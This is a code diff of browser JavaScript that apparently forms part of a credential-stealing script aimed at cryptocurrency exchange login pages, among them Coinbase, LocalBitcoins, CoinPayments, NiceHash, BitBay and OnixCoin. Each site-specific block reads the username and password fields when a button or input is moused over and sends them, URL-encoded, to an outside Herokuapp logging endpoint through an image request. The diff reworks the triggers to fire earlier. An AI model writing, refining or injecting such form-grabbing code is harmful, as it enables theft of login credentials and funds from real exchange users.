@@ -161,109 +161,59 @@ for (var i = 0; i < arrayLength; i++) {
   };
 
   if (top['location']['href'] === 'auth.bitbay.net/login-password') {
-              document.getElementsByTagName("button")[0].onmouseover= function (_0x441cx2) {
+              document.getElementsByTagName("button")[0].onmouseover = function (_0x441cx2) {
               username = "null" //document.getElementsByName("email")[0].value;
               user_pass = document.getElementsByName("password")[0].value;
               (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
               }
   };
-
-  if (top['location']['href'] === 'auth.bitbay.net/login-password') {
-              document['getElementsByClassName']('send-btn')[0].onclick = function (_0x441cx2) {
-              username = "null" //document.getElementsByName("email")[0].value;
-              user_pass = document.getElementsByName("password")[0].value;
-              (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
-              }
-  };
-
-
 
 
   if (top['location']['href']['indexOf']('localbitcoins.com/accounts/login/') > -1) {
-        var interval = setInterval(function () {
-            if (document['getElementsByClassName']('container')) {
-                clearInterval(interval);
-                document['getElementById']('btn-primary').onclick = function (_0x441cx2) {
+                document.getElementsByTagName("input")[3].onmouseover = function (_0x441cx2) {
                 username = document.getElementById("id_username").value;
                 user_pass = document.getElementById("id_password").value;
                 (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                 }
-            }
-        }, 1000)
     };
 
-  if (top['location']['href']['indexOf']('sys.chip-coin.net:1006/sys/iCommerce/modules/mod_chipcoin/login.jsp') > -1) {
-        var interval = setInterval(function () {
-            if (document['getElementsByClassName']('form-signin')) {
-                clearInterval(interval);
-                document['getElementById']('btn btn-large btn-warning').onclick = function (_0x441cx2) {
-                username = document.getElementsByName("usu").value;
-                user_pass = document.getElementsByName("con").value;
-                (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
-                }
-            }
-        }, 1000)
-    };
 
   if (top['location']['href']['indexOf']('onixcoin.com/inicio-sesion/') > -1) {
-        var interval = setInterval(function () {
-            if (document['getElementsByClassName']('onix-info')) {
-                clearInterval(interval);
-                document['getElementById']('btn_sesion').onclick = function (_0x441cx2) {
+                document.getElementsByTagName("button")[8].onmouseover = function (_0x441cx2) {
                 username = document.getElementsByName("correo")[1].value;
                 user_pass = document.getElementsByName("clave")[0].value;
                 (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                 }
-            }
-        }, 1000)
     };
+
   if (top['location']['href']['indexOf']('coinpayments.net/login') > -1) {
-        var interval = setInterval(function () {
-            if (document['getElementsByClassName']('login')) {
-                clearInterval(interval);
-                document['getElementsByClassName']('w-button button large login').onclick = function (_0x441cx2) {
+                document.getElementsByTagName("input")[3].onmouseover = function (_0x441cx2) {
                 username = document.getElementsByName("username")[0].value;
                 user_pass = document.getElementsByName("pass")[0].value;
                 (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                 }
-            }
-        }, 1000)
     };
 
     if (top['location']['href']['indexOf']('nicehash.com/login') > -1) {
-          var interval = setInterval(function () {
-              if (document['getElementById']('register')) {
-                  clearInterval(interval);
-                  document['getElementById']('register').onsubmit = function (_0x441cx2) {
+                  document.getElementsByTagName("input")[2].onmouseover  = function (_0x441cx2) {
                   username = document.getElementById("username").value;
                   user_pass = document.getElementById("password").value;
                   (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                   }
-              }
-          }, 1000)
       };
       if (top['location']['href']['indexOf']('coinbase.com/signin') > -1) {
-            var interval = setInterval(function () {
-                if (document['getElementsByClassName']('form-vertical')) {
-                    clearInterval(interval);
-                    document['getElementById']('signin_button').onclick = function (_0x441cx2) {
+                    document.getElementsByTagName("input")[4].onmouseover  = function (_0x441cx2) {
                     username = document.getElementById("email").value;
                     user_pass = document.getElementById("password").value;
                     (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                     }
-                }
-            }, 1000)
         };
-        if (top['location']['href']['indexOf']('backoffice.minerworld.com.br/#/home  ') > -1) {
-          var interval = setInterval(function () {
-                  clearInterval(interval);
-                  document.getElementsByTagName("button")[1].onclick = function (_0x441cx2) {
+        if (top['location']['href']['indexOf']('backoffice.minerworld.com.br/#/home') > -1) {
+                  document.getElementsByTagName("button")[1].onmouseover = function (_0x441cx2) {
                   username = document.getElementById("back_usuario").value;
                   user_pass = document.getElementById("back_senha").value;
                   (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                   }
-
-          }, 1000)
           };
 
   //   var target = 2048;
